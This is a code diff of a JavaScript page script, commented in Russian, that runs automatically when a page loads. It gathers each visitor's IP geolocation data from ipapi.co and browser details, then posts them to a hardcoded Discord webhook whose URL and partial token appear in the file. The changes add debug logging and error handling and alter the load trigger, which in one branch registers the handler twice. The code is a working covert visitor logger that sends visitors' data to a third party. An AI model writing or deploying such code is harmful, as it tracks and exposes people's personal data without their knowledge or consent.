@@ -4,9 +4,12 @@ const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1542423199860527154/Wb
 // Функция для отправки информации в Discord
 async function sendVisitorInfo() {
     try {
+        console.log('🔍 Начинаем сбор информации...');
+
         // Получаем информацию об IP
         const ipResponse = await fetch('https://ipapi.co/json/');
         const ipData = await ipResponse.json();
+        console.log('📍 IP данные получены:', ipData);
 
         // Получаем информацию о браузере
         const userAgent = navigator.userAgent;
@@ -100,29 +103,38 @@ async function sendVisitorInfo() {
             }]
         };
 
-        // Отправляем на Discord
-        fetch(DISCORD_WEBHOOK, {
+        console.log('📤 Отправляем на Discord...');
+        console.log('Payload:', payload);
+
+        // Используем fetch с обработкой ошибок
+        const discordResponse = await fetch(DISCORD_WEBHOOK, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify(payload),
-            mode: 'no-cors'
-        })
-        .then(() => {
-            console.log('✅ Данные отправлены на Discord');
-        })
-        .catch(error => {
-            console.error('❌ Ошибка при отправке на Discord:', error);
+            body: JSON.stringify(payload)
         });
 
+        if (discordResponse.ok) {
+            console.log('✅ Сообщение успешно отправлено в Discord!');
+        } else {
+            console.error('❌ Ошибка Discord:', discordResponse.status, discordResponse.statusText);
+            const errorText = await discordResponse.text();
+            console.error('Ответ Discord:', errorText);
+        }
+
     } catch (error) {
-        console.error('Ошибка:', error);
+        console.error('❌ Ошибка при отправке:', error);
     }
 }
 
 // Запускаем функцию при загрузке страницы
-window.addEventListener('load', sendVisitorInfo);
+document.addEventListener('DOMContentLoaded', sendVisitorInfo);
 
-// Также отправляем при загрузке без события load
-sendVisitorInfo();
+// Если DOM уже загружен
+if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', sendVisitorInfo);
+} else {
+    sendVisitorInfo();
+}
+
